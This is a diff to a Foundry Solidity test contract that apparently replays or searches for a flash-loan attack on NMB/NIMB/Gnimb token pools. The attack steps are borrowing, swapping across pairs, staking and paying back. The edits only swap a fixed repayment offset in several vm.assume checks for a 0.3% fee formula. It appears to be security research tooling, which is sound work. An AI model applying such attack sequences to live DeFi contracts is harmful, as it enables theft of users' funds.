@@ -321,7 +321,7 @@ contract NMBTest is Test, BlockLoader {
         printBalance("After step3 ");
         swap_pairnbuGnimb_Gnimb_nbu(Gnimb.balanceOf(attacker));
         printBalance("After step4 ");
-        swap_pairnbunimb_nbu_nimb(3 ether);
+        swap_pairnbunimb_nbu_nimb(3e18);
         printBalance("After step5 ");
         payback_nimb((100000000e18 * 1003) / 1000);
         printBalance("After step6 ");
@@ -337,7 +337,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
-        vm.assume(amt6 == amt0 + 300000000000000006245004);
+        vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_nimb(amt0);
         swap_pairnbunimb_nimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -355,7 +355,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 300000000000000006245004);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_nbu(amt0);
         swap_pairnbunimb_nbu_nimb(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -371,7 +371,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 300000000000000006245004);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_nbu(amt0);
         swap_pairnbuGnimb_nbu_Gnimb(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -387,7 +387,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 300000000000000006245004);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_nimb(amt0);
         swap_pairnbunimb_nimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -403,7 +403,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 300000000000000006245004);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_Gnimb(amt0);
         swap_pairnbuGnimb_Gnimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -420,7 +420,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 300000000000000006245004);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_nbu(amt0);
         swap_pairnbunimb_nbu_nimb(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -438,7 +438,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 300000000000000006245004);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_nbu(amt0);
         swap_pairnbuGnimb_nbu_Gnimb(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -456,7 +456,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 300000000000000006245004);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_nimb(amt0);
         swap_pairnbunimb_nimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -474,7 +474,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 300000000000000006245004);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_nimb(amt0);
         swap_pairnbunimb_nimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -492,7 +492,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 300000000000000006245004);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_Gnimb(amt0);
         swap_pairnbuGnimb_Gnimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -510,7 +510,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 300000000000000006245004);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_Gnimb(amt0);
         swap_pairnbuGnimb_Gnimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -529,7 +529,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
-        vm.assume(amt6 == amt0 + 300000000000000006245004);
+        vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_nimb(amt0);
         swap_pairnbunimb_nimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
@@ -549,7 +549,7 @@ contract NMBTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
-        vm.assume(amt6 == amt0 + 300000000000000006245004);
+        vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_Gnimb(amt0);
         swap_pairnbuGnimb_Gnimb_nbu(amt1);
         transaction_Gnimbstaking_Gnimb(amt2);
